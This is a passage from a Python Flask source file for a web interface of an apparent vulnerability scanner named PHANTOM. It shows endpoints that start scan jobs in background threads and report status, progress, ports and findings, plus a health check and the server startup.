    if not url.startswith(("http://","https://")): url = "https://" + url
    job = ScanJob(url)
    scans[job.id] = job
    threading.Thread(target=run_scan, args=(job,), daemon=True).start()
    return jsonify({"scan_id": job.id})

@app.route("/api/status/<scan_id>")
def status(scan_id):
    job = scans.get(scan_id)
    if not job: return jsonify({"error":"Not found"}), 404
    with job._lock:
        logs   = list(job.logs)
        vulns  = list(job.vulns)
        ports  = list(job.ports)
        chains = list(job.chains)
        pp     = {k: dict(v) for k,v in job.phase_prog.items()}
    return jsonify({
        "status":        job.status,
        "logs":          logs,
        "vulns":         vulns,
        "ports":         ports,
        "chains":        chains,
        "progress":      job.progress,
        "current_phase": job.current_phase,
        "phase_prog":    pp,
        "waf":           job.waf,
        "elapsed":       round(time.time()-job.start,1) if job.status=="running" else job.elapsed,
        "urls_count":    len(job.urls),
        "ports_count":   len(job.ports),
        "secrets":       job.secrets,
    })

@app.route("/health")
def health():
    return jsonify({"status":"ok","active":sum(1 for s in scans.values() if s.status=="running")})

if __name__ == "__main__":
    print(f"[*] PHANTOM v{SCAN_VERSION} web interface on port {PORT}")
    print(f"[*] Open: http://localhost:{PORT}")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)

